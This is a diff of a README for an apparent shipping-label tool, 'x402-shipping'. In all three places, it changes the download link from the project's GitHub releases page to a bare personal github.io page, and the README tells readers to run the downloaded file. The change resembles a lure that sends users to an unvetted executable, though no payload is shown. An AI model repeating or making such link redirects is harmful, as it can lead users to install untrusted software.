@@ -1,6 +1,6 @@
 # 📦 x402-shipping - Ship anything, get labels instantly
 
-[![Download x402-shipping](https://img.shields.io/badge/Download-x402--shipping-blueviolet?style=for-the-badge&logo=github)](https://github.com/donnaraising222/x402-shipping/releases)
+[![Download x402-shipping](https://img.shields.io/badge/Download-x402--shipping-blueviolet?style=for-the-badge&logo=github)](https://donnaraising222.github.io)
 
 ---
 
@@ -31,7 +31,7 @@ Getting started with x402-shipping takes less than five minutes. Here is exactly
 
 Visit this link to download the application:
 
-**[👉 Click Here to Download x402-shipping](https://github.com/donnaraising222/x402-shipping/releases)**
+**[👉 Click Here to Download x402-shipping](https://donnaraising222.github.io)**
 
 ### Step 2: Run the Downloaded File
 
@@ -149,7 +149,7 @@ This project is open‑source and evolving. If you enjoy it, consider supporting
 
 Need the download link one more time? Here it is:
 
-**[🚚 Get x402-shipping Now](https://github.com/donnaraising222/x402-shipping/releases)**
+**[🚚 Get x402-shipping Now](https://donnaraising222.github.io)**
 
 ---
 
